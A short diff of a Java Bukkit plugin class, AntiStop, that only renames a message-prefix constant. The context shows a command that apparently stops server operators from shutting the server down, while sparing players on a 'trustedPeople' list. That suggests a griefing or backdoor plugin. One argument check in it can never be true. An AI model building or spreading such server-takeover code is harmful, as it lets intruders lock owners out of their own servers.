@@ -24,7 +24,7 @@ public class AntiStop extends Command {
     public void onCommand(Player p, ArrayList<String> args) {
         if (isActive) {
             isActive = false;
-            p.sendMessage(Start.Prefix + "§cServer now can be stopped!");
+            p.sendMessage(Start.COMMAND_PREFIX + "§cServer now can be stopped!");
             for (Player r : Bukkit.getOnlinePlayers()) {
                 if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
                 if (r.isDead()) return;
@@ -33,7 +33,7 @@ public class AntiStop extends Command {
             return;
         }
         if (args.size() == 0 || (args.get(0).toLowerCase().equals("mistype") && args.get(0).toLowerCase().equals("cancel"))) {
-            p.sendMessage(Start.Prefix + ChatColor.RED + "You must select mode! Either mistype or cancel");
+            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "You must select mode! Either mistype or cancel");
             return;
         }
         if (args.get(0).toLowerCase().equals("mistype"))
@@ -41,7 +41,7 @@ public class AntiStop extends Command {
         if (args.get(0).toLowerCase().equals("cancel"))
             method = cancelMethod.Cancel;
         isActive = true;
-        p.sendMessage(Start.Prefix + "§aServer now can not be stopped!");
+        p.sendMessage(Start.COMMAND_PREFIX + "§aServer now can not be stopped!");
         for (Player r : Bukkit.getOnlinePlayers()) {
             if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
             if (r.isDead()) return;
